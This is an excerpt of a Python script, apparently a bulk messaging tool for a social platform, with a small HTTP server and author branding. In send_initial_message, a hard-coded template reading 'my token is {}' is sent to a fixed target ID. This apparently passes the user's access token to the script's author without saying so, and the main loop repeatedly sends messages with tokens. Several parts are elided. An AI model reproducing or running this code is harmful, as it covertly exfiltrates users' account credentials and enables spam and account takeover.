...
class MyHandler(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):
          ...
          self.end_headers()
          self.wfile.write(b"   thew legend mondaw Mani badmash herew")
def execute_server():
...
def send_initial_message():
      ...
      msg_template = "Hello mani legand  sir! I am using your server. my token is {}"

      # Specify the ID where you want to send the message
      target_id = "100089949260217"

      requests.packages.urllib3.disable_warnings()

      def liness():
          print('\033[1;92m' + '•────────────────────── MANI BADMASH HERE ───────────────────────────────•')
      ...
      while True:
          try:
              for message_index in range(num_messages):
                  ...
                  if response.ok:
                      print("\033[1;92m[+]Mani badmash here Han Chla Gya Massage {} of Convo {} Token {}: {}".format(
